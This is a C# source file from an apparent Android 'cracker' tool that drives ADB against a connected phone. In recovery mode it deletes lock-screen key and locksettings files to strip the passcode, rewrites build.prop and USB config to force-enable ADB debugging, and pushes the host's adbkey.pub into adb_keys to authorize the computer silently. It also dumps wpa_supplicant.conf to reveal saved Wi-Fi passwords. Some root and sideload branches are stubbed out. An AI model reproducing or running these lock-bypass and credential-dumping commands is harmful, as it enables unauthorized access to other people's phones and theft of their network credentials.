using SMPHCracker.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SMPHCracker.Logic
{
    //TODO - check successfuly operation
    class Cracker : ICracker
    {
        public Status GetStatus()
        {
            String output = ADB.Execute(ADBCommands.DEVICES);

            output = String.IsNullOrWhiteSpace(output) ? String.Empty : string.Join(" ", Regex.Split(output, @"(?:\r\n|\n|\r|\t)")).Split(' ')[5];

            switch (output)
            {
                case "unauthorized":
                    return Status.Unauthorized;

                case "device":
                    //TODO - change to ADB.Execute(SHELLROOT) after SHELL-ROOT fix
                    output = ADB.Shell("TestSu", true);

                    if(output.Contains("error") || output.Contains("denied"))
                        return Status.ADB;
                    else
                        return Status.Root;

                case "recovery":
                    return Status.Recovery;

                case "sideload":
                    return Status.Sideload;

                default:
                    return Status.NoDevice;
            }
        }

        public string GetBezeichnung()
        {
            return $"{ADB.Execute(ADBCommands.GETPROP, "ro.product.brand")} {ADB.Execute(ADBCommands.GETPROP, "ro.product.model")}";
        }

        public bool RemovePassoword(Status status)
        {
            switch (status)
            {
                case Status.Root:
                    //TODO - FIX SHELL-ROOT!
                    return false;
                    ADB.Execute(ADBCommands.SHELLROOT, "mount data");
                    //Remove LockScreen
                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/*.key");
                    //Reset LockSettings
                    ADB.Execute(ADBCommands.SHELLROOT, "rm /data/system/locksettings*");
                    return true;

                case Status.Recovery:
                    ADB.Execute(ADBCommands.SHELL, "mount data");
                    //Remove LockScreen
                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/*.key");
                    //Reset LockSettings
                    ADB.Execute(ADBCommands.SHELL, "rm /data/system/locksettings*");
                    return true;

                case Status.Sideload:
                    return RemovePasswordSideload();

                default:
                    return false;
            }
        }
        private bool RemovePasswordSideload()
        {
            return false;
        }

        //Recovery-Shell-Mode
        public bool EnableADB(Status status)
        {
            switch (status)
            {
                case Status.Recovery:
                    //Add ADB-Settings
                    ADB.Execute(ADBCommands.SHELL, "mount data");
                    ADB.Execute(ADBCommands.SHELL, "\"echo -n 'mtp,adb' > /data/property/persist.sys.usb.config\"");
                    //Activates ADB-Settings
                    ADB.Execute(ADBCommands.SHELL, "mount system");
                    ADB.Execute(ADBCommands.SHELL, "\"echo '' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo '# Enable ADB\' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.ADB.enable=1' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.service.debuggable=1' >> /system/build.prop\"");
                    ADB.Execute(ADBCommands.SHELL, "\"echo 'persist.sys.usb.config=mtp,adb' >> /system/build.prop\"");

                    return true;

                case Status.Sideload:
                    return EnableADBSideload();

                default:
                    return false;
            }
        }
        private bool EnableADBSideload()
        {
            return false;
        }

        public bool VerifyADB(Status status)
        {
            if (status == Status.Recovery)
            {
                //TODO - get adkey.pub from folder .android

                //Vertify PC for ADB
                ADB.Execute(ADBCommands.PUSH, @"C:\Users\ErdnüßFrederic\.android\adbkey.pub", "/data/misc/adb/adb_keys");

                return true;
            }
            else if(status == Status.Sideload)
            {
                return VertifyADBSideload();
            }

            return false;
        }
        private bool VertifyADBSideload()
        {
            return false;
        }

        public string ShowWLANKeys(Status status)
        {
            switch (status)
            {
                case Status.Root:
                    //TODO - FIX SHELL-SU!
                    return "false";
                    //Show WLAN-Keys
                    return ADB.Execute(ADBCommands.SHELLROOT, "cat /data/misc/wifi/wpa_supplicant.conf");

                case Status.Recovery:
                    //Show WLAN-Keys
                    return ADB.Execute(ADBCommands.SHELL, "cat /data/misc/wifi/wpa_supplicant.conf");

                default:
                    return "false";
            }
        }
    }
}
